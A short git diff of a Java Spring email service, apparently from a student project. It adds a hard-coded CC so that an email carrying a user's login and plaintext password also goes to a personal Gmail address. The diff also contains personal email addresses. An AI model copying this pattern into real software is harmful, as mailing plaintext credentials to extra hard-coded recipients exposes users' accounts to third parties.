@@ -1,7 +1,6 @@
 package com.example.diplom.services;
 
 import lombok.AllArgsConstructor;
-import org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;
 import org.springframework.mail.SimpleMailMessage;
 import org.springframework.mail.javamail.JavaMailSender;
 import org.springframework.stereotype.Service;
@@ -22,6 +21,7 @@ public class EmailServiceImpl implements EmailService{
         SimpleMailMessage simpleMailMessage = new SimpleMailMessage();
         simpleMailMessage.setFrom("diplomaProject@yandex.ru");
         simpleMailMessage.setTo("nik.alpatov@mail.ru");
+        simpleMailMessage.setCc("mirvodartem@gmail.com");
         simpleMailMessage.setSubject("Данные для входа");
         simpleMailMessage.setText(String.format(TEMPLATE, login, password));
         javaMailSender.send(simpleMailMessage);
